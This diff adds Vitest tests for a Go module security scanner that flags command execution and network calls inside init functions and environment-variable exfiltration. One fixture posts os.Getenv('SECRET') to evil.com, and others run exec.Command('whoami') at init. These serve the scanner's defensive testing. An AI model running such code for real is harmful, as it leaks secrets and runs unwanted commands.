@@ -1,5 +1,24 @@
 import { describe, it, expect } from "vitest";
 import { scanGoContent, scanGoSumContent, isGoFile, GO_PATTERNS } from "../go-scanner.js";
+import { matchPatternInContent } from "../patterns.js";
+
+function normalizePatternMatches(
+  content: string,
+  matches: ReturnType<typeof matchPatternInContent>,
+) {
+  const lineStarts = [0];
+  for (let index = 0; index < content.length; index++) {
+    if (content[index] === "\n") lineStarts.push(index + 1);
+  }
+
+  return matches.map((hit) => {
+    const matchIndex = hit.match.index ?? 0;
+    const absoluteStart = hit.match.input === content
+      ? matchIndex
+      : (lineStarts[hit.line - 1] ?? 0) + matchIndex;
+    return { line: hit.line, start: absoluteStart, evidence: hit.text };
+  });
+}
 
 describe("Go Module Scanner", () => {
   it("should identify Go-related files", () => {
@@ -63,10 +82,54 @@ describe("Go Module Scanner", () => {
       expect(findings.some((f) => f.rule === "GO_OS_EXEC")).toBe(true);
     });
 
+    it("should detect command execution inside init", () => {
+      const findings = scanGoContent(
+        'package main\nfunc init() { exec.Command("whoami") }',
+        "main.go",
+        "source",
+      );
+      expect(findings.some((f) => f.rule === "GO_INIT_EXEC")).toBe(true);
+    });
+
+    it("should detect network access inside init", () => {
+      const findings = scanGoContent(
+        'package main\nfunc init() { http.Get("https://example.com") }',
+        "main.go",
+        "source",
+      );
+      expect(findings.some((f) => f.rule === "GO_INIT_NETWORK")).toBe(true);
+    });
+
+    it("does not correlate calls after the closing init brace", () => {
+      const content = [
+        "package main",
+        'func init() { prepare() } func later() { exec.Command("x"); http.Get(url) }',
+      ].join("\n");
+      const findings = scanGoContent(content, "main.go", "source");
+      expect(findings.some((f) => f.rule === "GO_INIT_EXEC")).toBe(false);
+      expect(findings.some((f) => f.rule === "GO_INIT_NETWORK")).toBe(false);
+    });
+
     it("should detect env exfiltration pattern", () => {
       const content = 'func exfil() {\n    http.Post("https://evil.com", "text/plain", strings.NewReader(os.Getenv("SECRET")))\n}';
       const findings = scanGoContent(content, "main.go", "source");
       expect(findings.some((f) => f.rule === "GO_ENV_EXFIL")).toBe(true);
+    });
+
+    it("should detect env access before a network call", () => {
+      const content = 'func exfil() { value := os.Getenv("SECRET"); http.Client{} }';
+      const findings = scanGoContent(content, "main.go", "source");
+      expect(findings.some((f) => f.rule === "GO_ENV_EXFIL")).toBe(true);
+    });
+
+    it("does not report isolated or line-terminator-separated exfil signals", () => {
+      const content = [
+        'value := os.Getenv("SECRET")',
+        "os.Getenv\rhttp.Post",
+        "http.Post\ros.Getenv",
+      ].join("\n");
+      const findings = scanGoContent(content, "main.go", "source");
+      expect(findings.some((f) => f.rule === "GO_ENV_EXFIL")).toBe(false);
     });
 
     it("should not flag clean Go source", () => {
@@ -122,6 +185,81 @@ describe("Go Module Scanner", () => {
     const content = "module x\n\ngo 1.21\n\nreplace x => ../y";
     const findings = scanGoContent(content, "go.mod", "mod");
     expect(findings.find((f) => f.rule === "GO_REPLACE_DIRECTIVE")?.line).toBe(5);
+  });
+
+  it("matches the legacy regex verdict on Go correlation edge cases", () => {
+    const cases: Array<[string, string[]]> = [
+      ["GO_INIT_EXEC", [
+        "func init() { exec.Command(one); exec.Command(two) }",
+        "func first init() func init() exec.Command(one) exec.Command(two)",
+        "func init() { done() } exec.Command(cmd)",
+        "func INIT ( ) exec.Command(one) EXEC.Command(two)",
+        "func init() exec.Command(one)\rexec.Command(two)",
+        "func init() exec.Command(one)\u2028exec.Command(two)",
+        "func init() exec.Command(one)\u2029exec.Command(two)",
+        "before\nfunc init() exec.Command(one) exec.Command(two)",
+      ]],
+      ["GO_INIT_NETWORK", [
+        "func init() http.NewRequest() net.Dial(addr) http.Post(url)",
+        "func first init() func init() http.Get(one) http.Post(two)",
+        "func init() { done() } net.Dial(addr)",
+        "func init() http.Get(one)\rnet.Dial(two)",
+        "func init() http.Get(one)\u2028net.Dial(two)",
+        "func init() http.Get(one)\u2029net.Dial(two)",
+      ]],
+      ["GO_ENV_EXFIL", [
+        "os.Getenv(name); http.Foo() x net.Dial(addr)",
+        "os.GetenvValue then http.Post(url)",
+        "http.Foo(); os.GetenvValue",
+        "http.Post(url); os.GetenvValue",
+        "http.Post(one); os.Getenv(name) x os.GetenvValue",
+        "os.Getenv(name) http.Get(one) http.Foo() net.Dial(two)",
+        "os.Getenv\rhttp.Post",
+        "os.Getenv\u2028http.Post",
+        "os.Getenv\u2029http.Post",
+        "http.Post\ros.GetenvValue",
+        "http.Post\u2028os.GetenvValue",
+        "http.Post\u2029os.GetenvValue",
+        "before\nhttp.Post(url) os.GetenvValue x os.GetenvOther",
+      ]],
+    ];
+
+    for (const [rule, sources] of cases) {
+      const structural = GO_PATTERNS.find((entry) => entry.rule === rule)!;
+      const regex = { ...structural, correlatedMatcher: undefined };
+      for (const content of sources) {
+        const expected = normalizePatternMatches(
+          content,
+          matchPatternInContent(regex, content, "i"),
+        );
+        const actual = normalizePatternMatches(
+          content,
+          matchPatternInContent(structural, content, "i"),
+        );
+        expect(actual, `${rule}: ${JSON.stringify(content)}`).toEqual(expected);
+      }
+    }
+  });
+
+  it("fully scans 5 MiB Go correlation near misses in linear time", { timeout: 15_000 }, () => {
+    const size = 5 * 1024 * 1024;
+    const cases: Array<[string, string]> = [
+      ["GO_INIT_EXEC", "func init()x"],
+      ["GO_INIT_NETWORK", "func init()x"],
+      ["GO_ENV_EXFIL", "os.Getenv x"],
+    ];
+    const started = Date.now();
+
+    for (const [rule, unit] of cases) {
+      const pattern = GO_PATTERNS.find((entry) => entry.rule === rule)!;
+      const content = unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
+      const hits = matchPatternInContent(pattern, content, "i");
+      expect(hits, rule).toHaveLength(0);
+      expect(hits.coverage.complete, rule).toBe(true);
+      expect(hits.coverage.regexAttempts, rule).toBe(1);
+    }
+
+    expect(Date.now() - started).toBeLessThan(5_000);
   });
 
   it("should have patterns array", () => {
